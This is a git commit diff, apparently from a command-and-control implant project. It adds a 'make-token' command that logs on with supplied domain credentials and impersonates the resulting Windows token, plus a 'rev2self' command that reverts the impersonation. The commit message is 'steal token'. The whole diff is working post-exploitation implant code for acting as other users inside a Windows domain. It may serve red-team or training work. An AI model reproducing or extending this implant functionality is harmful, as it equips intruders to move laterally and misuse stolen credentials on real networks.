287d97843a52887e654b9e807a9e1604779196f6
poptartsommelier <rich.d.nospam@gmail.com>
2023-02-28 23:35:46 +0000

    steal token

---
+++ Agent/Commands/MakeToken.cs
@@ -0,0 +1,37 @@
+﻿using Agent.Models;
+
+using System;
+using System.Security.Principal;
+
+namespace Agent.Commands
+{
+    internal class MakeToken : AgentCommand
+    {
+        public override string Name => "make-token";
+
+        public override string Execute(AgentTask task)
+        {
+            string userDomain = task.Arguments[0];
+            string password = task.Arguments[1];
+
+            var split = userDomain.Split('\\');
+            var domain = split[0];
+            var username = split[1];
+
+            var hToken = IntPtr.Zero;
+
+            if (Native.Advapi.LogonUserA(username, domain, password, Native.Advapi.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS, Native.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
+            {
+                if (Native.Advapi.ImpersonateLoggedOnUser(hToken))
+                {
+                    var identity = new WindowsIdentity(hToken);
+                    return $"Successfully impersonated {identity.Name}";
+                }
+
+                return $"Succesfully made token, but failed to impersonate";
+            }
+
+            return "Failed to make token";
+        }
+    }
+}
---
+++ Agent/Commands/RevToSelf.cs
@@ -0,0 +1,24 @@
+﻿using Agent.Models;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Agent.Commands
+{
+    public class RevToSelf : AgentCommand
+    {
+        public override string Name => "rev2self";
+
+        public override string Execute(AgentTask task)
+        {
+            if (Native.Advapi.RevertToSelf())
+            {
+                return "Reverted to self";
+            }
+
+            return "Failed to revert";
+        }
+    }
+}
